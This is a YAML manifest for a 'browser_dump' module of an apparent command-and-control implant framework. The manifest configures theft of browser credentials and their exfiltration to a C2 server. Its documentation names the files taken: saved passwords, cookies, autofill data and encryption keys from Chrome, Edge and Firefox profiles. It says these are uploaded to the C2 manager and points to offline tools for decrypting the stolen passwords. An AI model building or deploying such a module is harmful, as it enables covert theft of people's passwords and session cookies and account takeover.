module:
  id: browser_dump
  version: "1.0.0"
  display_name: "Browser Dump"
  description: "Extract and upload browser credential databases to C2 manager"

  requires:
    - file_transfer  # Uses HandleFileUpload for uploading extracted files

  provides:
    - BrowserDump
    - DumpChromiumBrowser
    - DumpFirefox
    - JoinArray

  files:
    - code.ahk

  dispatch:
    browser_dump: BrowserDump

  schema:
    category_id: credential_access
    category_name: "Credential Access"
    modules:
      browser_dump:
        display_name: "Browser Dump"
        description: "Extract and upload browser credential databases to C2 manager"
        command_template: "execute_module|BrowserDump|{chrome},{edge},{firefox}"
        parameters:
          chrome:
            type: boolean
            display_name: "Google Chrome"
            description: "Extract data from Google Chrome"
            required: false
            default: true
          edge:
            type: boolean
            display_name: "Microsoft Edge"
            description: "Extract data from Microsoft Edge (Chromium)"
            required: false
            default: true
          firefox:
            type: boolean
            display_name: "Mozilla Firefox"
            description: "Extract data from Mozilla Firefox"
            required: false
            default: true
        documentation:
          content: |
            Extracts critical files from selected browsers and uploads them individually to the C2 manager.

            For Chrome/Edge - uploads Login Data (saved passwords), Cookies, Web Data (autofill),
            History, Bookmarks, Preferences, and Local State (encryption key).

            For Firefox - uploads logins.json (encrypted passwords), key4.db (encryption key),
            cookies.sqlite, and places.sqlite (history/bookmarks).

            Supports multiple profiles for all browsers. Files are renamed with browser name and
            timestamps to prevent collisions.

            Use offline tools like ChromePass, WebBrowserPassView, or Firefox Decrypt to extract credentials.
          examples:
            - "Select all browsers for comprehensive extraction"
            - "Select only Chrome if Firefox is not installed"
        execution:
          timeout: 600
          requires_admin: false
        ui:
          layout: simple

  config_options: {}
